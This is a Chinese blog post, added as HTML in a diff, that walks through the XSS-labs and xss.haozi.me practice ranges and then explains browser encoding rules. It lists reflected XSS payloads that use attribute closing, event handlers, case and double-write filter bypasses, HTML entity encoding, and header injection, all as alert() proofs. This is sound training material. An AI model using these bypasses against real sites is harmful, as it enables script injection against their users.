@@ -1,0 +1,427 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>XSS | wanan</title><meta name="keywords" content="XSS,靶场"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XSStrikeXSSlabs靶场payload?name&#x3D;&lt;script&gt;alert(&#x2F;1&#x2F;)&lt;&#x2F;script&gt;?keyword&#x3D;&quot;&gt;&lt;script&gt;alert(&#x2F;1&#x2F;)&lt;&#x2F;script&gt;&#x2F;&#x2F;?keyword&#x3D;&amp;#x27;onfocus&#x3D;javascript:alert(&amp;#x27;xss&amp;#x27;)&gt;&#x2F;&#x2F;&amp;subm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS">
+<meta property="og:url" content="https://www.wanan.red/XSS/XSS/XSS/index.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="XSStrikeXSSlabs靶场payload?name&#x3D;&lt;script&gt;alert(&#x2F;1&#x2F;)&lt;&#x2F;script&gt;?keyword&#x3D;&quot;&gt;&lt;script&gt;alert(&#x2F;1&#x2F;)&lt;&#x2F;script&gt;&#x2F;&#x2F;?keyword&#x3D;&amp;#x27;onfocus&#x3D;javascript:alert(&amp;#x27;xss&amp;#x27;)&gt;&#x2F;&#x2F;&amp;subm">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg">
+<meta property="article:published_time" content="2022-08-30T05:52:49.194Z">
+<meta property="article:modified_time" content="2022-08-30T05:53:42.223Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/XSS/XSS/XSS/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-08-30 13:53:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-30T05:52:49.194Z" title="发表于 2022-08-30 13:52:49">2022-08-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-30T05:53:42.223Z" title="更新于 2022-08-30 13:53:42">2022-08-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/XSS/">XSS</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h1><h1 id="XSSlabs靶场"><a href="#XSSlabs靶场" class="headerlink" title="XSSlabs靶场"></a>XSSlabs靶场</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br><span class="line">?keyword=&quot;&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;//</span><br><span class="line">?keyword=&#x27;onfocus=javascript:alert(&#x27;xss&#x27;)&gt;//&amp;submit=搜索</span><br><span class="line">?keyword=&quot;onfocus=javascript:alert(&#x27;xss&#x27;)&gt;//&amp;submit=搜索</span><br><span class="line">?keyword=&quot;&gt; &lt;a href=javascript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //&amp;submit=搜索</span><br><span class="line">?keyword=&quot;&gt;&lt;scRipt&gt;alert(/1/)&lt;/scRipt&gt;//&amp;submit=搜索</span><br><span class="line">?keyword=&quot;&gt;&lt;scscriptript&gt;alert(/1/)&lt;/scscriptript&gt;//&amp;submit=搜索</span><br><span class="line">?keyword=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&amp;submit=添加友情链接</span><br><span class="line">?keyword=&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&amp;submit=添加友情链接</span><br><span class="line">?keyword=&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;//http://wwww.baidu.com&amp;submit=添加友情链接</span><br><span class="line">?t_link=&amp;t_history=&amp;t_sort=&quot;onfocus=javascript:alert(&#x27;xss&#x27;) &gt; //</span><br><span class="line">referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br><span class="line">User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br><span class="line">Cookie: user=&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="无过滤xss"><a href="#无过滤xss" class="headerlink" title="无过滤xss"></a>无过滤xss</h2><p>可以看到有高亮提示xss</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405140826356.png" alt="image-20220405140826356"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405141201800.png" alt="image-20220405141201800"></p>
+<p>工具也扫到了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405141240660.png" alt="image-20220405141240660"></p>
+<p>发现参数传递到了&lt;h2 这里&gt;</p>
+<p>简单语句试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405141409560.png" alt="image-20220405141409560"></p>
+<p>我们看看他是怎么执行的呢</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405141506775.png" alt="image-20220405141506775"></p>
+<p>发现是将代码直接替换进去,导致替换进去的字符当成js代码执行了</p>
+<p>代码段也可以看到,直接将name替换进去了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405141657542.png" alt="image-20220405141657542"></p>
+<p>这里并没有写入数据库,所以就是一个客户端的一个反射型xss.危害并不大,说白了就是用户自己玩的.</p>
+<h2 id="闭合input属性"><a href="#闭合input属性" class="headerlink" title="闭合input属性"></a>闭合input属性</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405142021883.png" alt="image-20220405142021883"></p>
+<p>可见这里传入的值放到了&lt;h2这里&lt;&#x2F;h2&gt;,不过这是没有影响的,我们尝试一下上一关的语句</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405142827001.png" alt="image-20220405142827001"></p>
+<p>发现没有弹窗</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405142833827.png" alt="image-20220405142833827"></p>
+<p>可以发现这里也是对&lt;&gt;进行了转义处理.猜测在服务器端用htmlspecialchars()函数对keyword参数的值进行了处理。</p>
+<p>但是往下看一下,有一个value的值并没有被转义处理.这样我们是不是可以尝试着闭合一下value呢</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert(/1/)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;//&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405142805537.png" alt="image-20220405142805537"></p>
+<p>这里左边的”&gt;闭合input右边&#x2F;&#x2F;注释后面的</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405143201906.png" alt="image-20220405143201906"></p>
+<p>这是扫到的几个</p>
+<h2 id="input标签属性"><a href="#input标签属性" class="headerlink" title="input标签属性"></a>input标签属性</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405143536708.png"></p>
+<p>这里也都是用了htmlspecialchars()函数进行了处理</p>
+<p>那么可以通过input标签的特殊事件来执行js但</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=&#x27;&amp;lt;script&amp;gt;alert(/1/)&amp;lt;/script&amp;gt;&#x27;&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27;onfocus=javascript:alert(&#x27;xss&#x27;) &gt; //&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405144008647.png" alt="image-20220405144008647"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405144035803.png"></p>
+<p>这里需要点击一下搜索框才能触发</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">onfocus 事件在对象获得焦点时发生。</span><br><span class="line">onfocus 通常用于 &lt;input&gt;, &lt;select&gt;, 和&lt;a&gt;.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405144256072.png" alt="image-20220405144256072"></p>
+<p>这里工具也是没有扫出来的,原因是没有’进行闭合的payload</p>
+<h2 id="input标签属性-1"><a href="#input标签属性-1" class="headerlink" title="input标签属性"></a>input标签属性</h2><p><img src="C:/Users/14980/AppData/Roaming/Typora/typora-user-images/image-20220405144512970.png" alt="image-20220405144512970"></p>
+<p>可以看到上面是转义,下面是将&lt;&gt;去掉了.这里也是使用上一关的直接过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&quot;onfocus=javascript:alert(&#x27;xss&#x27;) &gt; //&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405150443044.png" alt="image-20220405150443044"></p>
+<h2 id="herf属性"><a href="#herf属性" class="headerlink" title="herf属性"></a>herf属性</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405150031018.png" alt="image-20220405150031018"></p>
+<p>这里也是可以看到是对script这个字符进行的处理</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405150145238.png" alt="image-20220405150145238"></p>
+<p>换一个标签继续执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt; &lt;a href=javascript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405150314765.png" alt="image-20220405150314765"></p>
+<p>点击链接就执行</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405150458424.png" alt="image-20220405150458424"></p>
+<p>第五关也没扫到</p>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405150704646.png" alt="image-20220405150704646"></p>
+<p>大小写绕过就好</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;scRipt&gt;alert(/1/)&lt;/scRipt&gt;//&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405151053140.png" alt="image-20220405151053140"></p>
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405151158554.png" alt="image-20220405151158554"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptript&gt;alert(/1/)&lt;/scscriptript&gt;//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405152217691.png" alt="image-20220405152217691"></p>
+<p>可见这里payload也没有双写的</p>
+<h2 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405151732354.png" alt="image-20220405151732354"></p>
+<p>双写替换都不成</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405151819997.png" alt="image-20220405151819997"></p>
+<p>将我们要提交的进行unicode编码试试</p>
+<p>html10编码</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405152051856.png" alt="image-20220405152051856"></p>
+<p>html16编码</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405152147720.png" alt="image-20220405152147720"></p>
+<p>两个都可以</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405152300235.png" alt="image-20220405152300235"></p>
+<p>也没有html编码的</p>
+<h2 id="格式判断"><a href="#格式判断" class="headerlink" title="格式判断"></a>格式判断</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405152520098.png" alt="image-20220405152520098"></p>
+<p>可见对url进行了判断,所以只要构造一个合理的url就ok</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x27;xss&#x27;)//http://wwww.baidu.com</span><br><span class="line"></span><br><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;//http://wwww.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>两个中间的是&#x2F;&#x2F;注释符哦不然会影响alert执行的</p>
+<p>第八关都没扫到,第九关肯定也扫不到</p>
+<h2 id="hidden属性"><a href="#hidden属性" class="headerlink" title="hidden属性"></a>hidden属性</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405153301126.png" alt="image-20220405153301126"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405153308358.png" alt="image-20220405153308358"></p>
+<p>没有了value,但是多了三个hidden的值</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405153348663.png" alt="image-20220405153348663"></p>
+<p>这里也可以看到有过滤,而且只有t_sort有值传入,所以可以让他显示就好</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405153506757.png" alt="image-20220405153506757"></p>
+<p>把这个hidden去掉就好.记得点的时候也要在去掉hidden哦</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;onfocus=javascript:alert(&#x27;xss&#x27;) &gt; //</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405153656228.png" alt="image-20220405153656228"></p>
+<p>当然聪明的你在地址栏直接输也可以</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405154459183.png" alt="image-20220405154459183"></p>
+<h2 id="reffer构造"><a href="#reffer构造" class="headerlink" title="reffer构造"></a>reffer构造</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405154016445.png" alt="image-20220405154016445"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405154033684.png" alt="image-20220405154033684"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405154620614.png" alt="image-20220405154620614"></p>
+<p>简单构造下</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405154642803.png" alt="image-20220405154642803"></p>
+<h2 id="ua构造"><a href="#ua构造" class="headerlink" title="ua构造"></a>ua构造</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405154834290.png" alt="image-20220405154834290"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405154857918.png" alt="image-20220405154857918"></p>
+<h2 id="cookie构造"><a href="#cookie构造" class="headerlink" title="cookie构造"></a>cookie构造</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405155104420.png" alt="image-20220405155104420"></p>
+<h1 id="xss靶场练习xss-haozi-me"><a href="#xss靶场练习xss-haozi-me" class="headerlink" title="xss靶场练习xss.haozi.me"></a>xss靶场练习xss.haozi.me</h1><h2 id="无过滤在div之间"><a href="#无过滤在div之间" class="headerlink" title="无过滤在div之间"></a>无过滤在div之间</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>(/<span class="number">1</span>/)&lt;/script&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415220125233.png" alt="image-20220415220125233"></p>
+<h2 id="无过滤在textarea之间"><a href="#无过滤在textarea之间" class="headerlink" title="无过滤在textarea之间"></a>无过滤在textarea之间</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>(/<span class="number">1</span>/)&lt;/script&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure>
+
+<p>进行前后闭合</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415220333373.png" alt="image-20220415220333373"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;img src=<span class="string">&quot;&quot;</span> onerror=<span class="title function_ invoke__">alert</span>(/<span class="number">1</span>/)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过错误事件,因为src是不存在的所以当产生错误之后就会执行alert(&#x2F;1&#x2F;)</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415220540314.png" alt="image-20220415220540314"></p>
+<h2 id="无过滤注入在字符串内"><a href="#无过滤注入在字符串内" class="headerlink" title="无过滤注入在字符串内"></a>无过滤注入在字符串内</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415220714666.png" alt="image-20220415220714666"></p>
+<h2 id="过滤-括号和方括号"><a href="#过滤-括号和方括号" class="headerlink" title="过滤([])括号和方括号"></a>过滤([])括号和方括号</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`<span class="number">1</span>`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>反引号来代替</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415220958426.png" alt="image-20220415220958426"></p>
+<h1 id="通过浏览器编码深入xss绕过"><a href="#通过浏览器编码深入xss绕过" class="headerlink" title="通过浏览器编码深入xss绕过"></a>通过浏览器编码深入xss绕过</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="html编码-字符实体"><a href="#html编码-字符实体" class="headerlink" title="html编码(字符实体)"></a>html编码(字符实体)</h3><p>字符实体是一个预先定义好的转义序列.字符实体有两种表示方法:</p>
+<ol>
+<li>字符实体以&amp;开头+预先定义的实体名称+;分号结束,如”&lt;”的实体名称为<code>&amp;lt</code>;</li>
+<li>字符实体还以以&amp;开头+#符号+字符在ascii对应的十进制数字+;分号结束,如&lt;的字符实体编码时&amp;#60;</li>
+</ol>
+<p>字符都是有实体编号的,但是有的字符是没有实体名称</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415222905027.png" alt="image-20220415222905027"></p>
+<h3 id="javascript编码"><a href="#javascript编码" class="headerlink" title="javascript编码"></a>javascript编码</h3><p>最常用的,如\uxxxx这种写法的unicode转义序列,表示一个字符,其中xxxx表示一个16进制的数字,如&lt;的unicode编码为\u003c</p>
+<h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>RFC3986文档中规定,url中只允许包含英文字母(a-zA-Z) 数字(0-9) -_.~四个特殊字符以及所有保留字符RFC3986中指定以下字符为保留字符 ! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p>
+<p>编码方式 %加字符在ascii码表中的十六进制只. &#x2F; 在ascii中十六进制为0x2f,那么它对应的url编码为%2f</p>
+<p>javascript中提供了3个函数用来对url编码以得到合法的url</p>
+<ol>
+<li>escape()</li>
+<li>encodeURL()</li>
+<li>encodeURLComponent()</li>
+</ol>
+<h2 id="浏览器编码解码规则"><a href="#浏览器编码解码规则" class="headerlink" title="浏览器编码解码规则"></a>浏览器编码解码规则</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415223618303.png" alt="image-20220415223618303"></p>
+<p>浏览器无论什么情况下都会遵守一个这样的解码规则</p>
+<ol>
+<li>html解析器对html文档进行解析,完成html解码并且创建dom树</li>
+<li>javascript或者css解析器对内联脚本进行解析,完成js css解码</li>
+<li>url解码会根据url所在的顺序不同而在js解码前或者解码后</li>
+</ol>
+<h2 id="html解析器"><a href="#html解析器" class="headerlink" title="html解析器"></a>html解析器</h2><p>html中有五类元素</p>
+<ol>
+<li>空元素(void elements),有area base br col command embed hr img input keygen link meta param source track wbr</li>
